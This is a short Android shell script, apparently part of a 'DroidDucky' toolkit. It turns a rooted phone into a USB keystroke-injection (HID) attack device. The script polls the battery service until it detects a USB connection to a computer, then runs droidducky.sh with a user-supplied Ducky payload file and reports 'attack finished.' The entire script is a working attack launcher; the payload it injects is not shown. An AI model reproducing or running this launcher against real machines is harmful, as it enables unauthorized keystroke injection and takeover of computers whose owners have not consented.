#!/system/bin/sh
export PATH=/system_ext/bin:$PATH

payload=$1
state=$(dumpsys battery | grep 'USB powered' | awk '{print $3}')
if [ -z $payload  ]; then
	echo "usage: $0 duck.dd"
	exit 1
fi

echo "Starting hid attack..."

if [ $state == "true" ]; then
	echo "USB powered detected ($state)"
        bash droidducky.sh $payload 2>/dev/null
        echo "attack finished."
else
	echo "USB powered is $state"
	echo "wait and detect USB powered..."
	while true; do

		usb_state=$(dumpsys battery | grep 'USB powered' | awk '{print $3}')
		if [ $usb_state == "true"  ]; then
			echo "USB powered detected ($usb_state) !"
			sleep 2
			bash droidducky.sh $payload 2>/dev/null
			echo "attack finished."
			break
		fi
	done
fi

